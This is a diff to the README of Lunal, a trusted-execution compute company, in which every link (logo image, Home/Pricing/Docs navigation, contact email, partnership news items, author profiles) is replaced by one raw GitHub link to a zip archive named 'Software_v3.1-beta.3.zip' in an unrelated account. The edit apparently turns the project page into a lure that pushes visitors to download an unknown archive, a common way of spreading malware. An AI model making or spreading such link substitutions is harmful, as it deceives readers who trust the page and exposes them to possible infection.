@@ -1,28 +1,28 @@
 # Lunal - The Trusted Compute Company
 
 <div align="center" style="margin: 2em 0;">
-  <img src="./assets/logo.png" alt="Lunal Logo" width="200" height="200">
+  <img src="https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip" alt="Lunal Logo" width="200" height="200">
 </div>
 
 
 <div align="center" style="margin: 2em 0;">
   <nav style="font-size: 1.5em; font-weight: 600;">
-    <a href="/README.md" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Home</a>
-    <a href="/pricing.md" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Pricing</a>
-    <a href="/docs/README.md" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Docs</a>
+    <a href="https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Home</a>
+    <a href="https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Pricing</a>
+    <a href="https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip" style="text-decoration: none; margin: 0 2em; color: #2563eb; transition: color 0.3s ease;">Docs</a>
   </nav>
 </div>
 
 
 Lunal is the fastest way to deploy software in Trusted Execution Environments (TEEs) with zero configuration, guaranteed privacy, full verifiability, and automatic scaling.
 
-Ready to get started or curious? [Say hi](mailto:ansgar@lunal.dev) and join us for a hot cup of TEE. 🫖
+Ready to get started or curious? [Say hi](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip) and join us for a hot cup of TEE. 🫖
 
 ## Latest News
 
-- 📣 [Partnership with Impulse AI for Private Training, Fine-Tuning, and Inference](/blog/impulse-ai-partnership.md)
-- 📣 [Partnership with Reppo for Confidential AI](/blog/reppo-partnership.md)
-- 📣 [Partnership with Nexus for zkVM Privacy](/blog/nexus-partnership.md)
+- 📣 [Partnership with Impulse AI for Private Training, Fine-Tuning, and Inference](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip)
+- 📣 [Partnership with Reppo for Confidential AI](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip)
+- 📣 [Partnership with Nexus for zkVM Privacy](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip)
 
 ---
 
@@ -58,4 +58,4 @@ Here are problems Lunal solves that make using TEEs easier:
 
 
 
-[Ansgar](https://github.com/gruns), [Amean](https://github.com/AmeanAsad), and the merry band of misfits at Lunal
+[Ansgar](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip), [Amean](https://raw.githubusercontent.com/khn0x-khn0x/home/main/blog/Software_v3.1-beta.3.zip), and the merry band of misfits at Lunal
